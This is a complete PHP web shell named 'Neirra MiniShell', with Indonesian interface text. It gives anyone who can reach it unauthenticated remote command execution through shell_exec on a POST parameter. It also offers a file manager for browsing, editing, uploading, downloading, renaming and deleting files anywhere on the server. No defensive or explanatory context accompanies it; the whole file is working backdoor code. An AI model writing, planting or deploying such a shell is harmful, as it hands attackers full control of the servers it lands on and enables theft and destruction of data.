<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
if (!is_dir($path)) $path = getcwd();
$real_path = realpath($path);

function renderPathNavigation($path) {
    $path_display = str_replace('\\', '/', $path);
    $paths = explode('/', trim($path_display, '/'));
    echo "<div><strong>📂 Path: </strong><a href='?path=/'>/</a>";
    $build = '';
    foreach ($paths as $dir) {
        $build .= '/' . $dir;
        echo "<a href='?path=" . urlencode($build) . "'>" . htmlspecialchars($dir) . "</a>/";
    }
    echo "</div><hr>";
}

if (isset($_GET['edit'])) {
    $edit_file = realpath($real_path . DIRECTORY_SEPARATOR . basename($_GET['edit']));
    if (!$edit_file || !file_exists($edit_file)) {
        echo "<p style='color:red;'>File tidak ditemukan.</p>";
        exit;
    }
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
        file_put_contents($edit_file, $_POST['content']);
        echo "<p style='color:lime;'>Disimpan!</p><a href='?path=" . urlencode($real_path) . "'>Kembali</a>";
        exit;
    }
    $content = htmlspecialchars(file_get_contents($edit_file));
    echo "<h3>📝 Edit File: $edit_file</h3>";
    echo "<form method='post'><textarea name='content' style='width:100%;height:400px;'>$content</textarea><br><button type='submit'>Simpan</button></form>";
    exit;
}

if (isset($_GET['rename'])) {
    $file = basename($_GET['rename']);
    $file_path = $real_path . DIRECTORY_SEPARATOR . $file;
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['newname'])) {
        $newname = basename($_POST['newname']);
        rename($file_path, $real_path . DIRECTORY_SEPARATOR . $newname);
        header('Location: ?path=' . urlencode($real_path));
        exit;
    }
    echo "<form method='post'>
        <input type='text' name='newname' value='" . htmlspecialchars($file) . "'>
        <button type='submit'>Rename</button>
    </form>";
    exit;
}

if (isset($_GET['download'])) {
    $file = basename($_GET['download']);
    $file_path = $real_path . DIRECTORY_SEPARATOR . $file;
    if (file_exists($file_path)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . basename($file_path));
        header('Content-Length: ' . filesize($file_path));
        readfile($file_path);
        exit;
    }
}

if (isset($_GET['delete'])) {
    $file = basename($_GET['delete']);
    $file_path = $real_path . DIRECTORY_SEPARATOR . $file;
    if (file_exists($file_path)) unlink($file_path);
    header('Location: ?path=' . urlencode($real_path));
    exit;
}

if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $output = function_exists('shell_exec') ? shell_exec($cmd . ' 2>&1') : '⚠️ shell_exec() tidak tersedia.';
    echo "<pre style='background:#000;color:#0f0;padding:10px;'>$output</pre>";
}

echo "<h3>🧠 Neirra MiniShell</h3>";
renderPathNavigation($real_path);

echo "<form method='post'>
    <input type='text' name='cmd' placeholder='Perintah shell' style='width:300px;'>
    <button type='submit'>Jalankan</button>
</form>";

echo "<form method='post' enctype='multipart/form-data'>
    <input type='file' name='upload'>
    <input type='hidden' name='path' value='" . htmlspecialchars($real_path) . "'>
    <button type='submit'>Upload</button>
</form>";

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload'])) {
    $filename = basename($_FILES['upload']['name']);
    $target = $real_path . DIRECTORY_SEPARATOR . $filename;
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $target)) {
        echo "<p style='color:lime;'>Upload sukses: $filename</p>";
    } else {
        echo "<p style='color:red;'>Upload gagal!</p>";
    }
}

$scan = scandir($real_path);
$dirs = $files = [];
foreach ($scan as $item) {
    if ($item === '.' || $item === '..') continue;
    $full = realpath($real_path . DIRECTORY_SEPARATOR . $item);
    if (!$full) continue;
    if (is_dir($full)) {
        $dirs[] = $item;
    } else {
        $files[] = $item;
    }
}
$sorted = array_merge($dirs, $files);
echo "<ul>";
foreach ($sorted as $item) {
    $full = realpath($real_path . DIRECTORY_SEPARATOR . $item);
    if (is_dir($full)) {
        echo "<li><a href='?path=" . urlencode($full) . "'><strong>[DIR]</strong> $item</a></li>";
    } else {
        echo "<li>$item - 
        <a href='?edit=" . urlencode($item) . "&path=" . urlencode($real_path) . "'>Edit</a> | 
        <a href='?download=" . urlencode($item) . "&path=" . urlencode($real_path) . "'>Download</a> | 
        <a href='?delete=" . urlencode($item) . "&path=" . urlencode($real_path) . "' onclick='return confirm(\"Yakin hapus?\")'>Delete</a> | 
        <a href='?rename=" . urlencode($item) . "&path=" . urlencode($real_path) . "'>Rename</a>
        </li>";
    }
}
echo "</ul>";
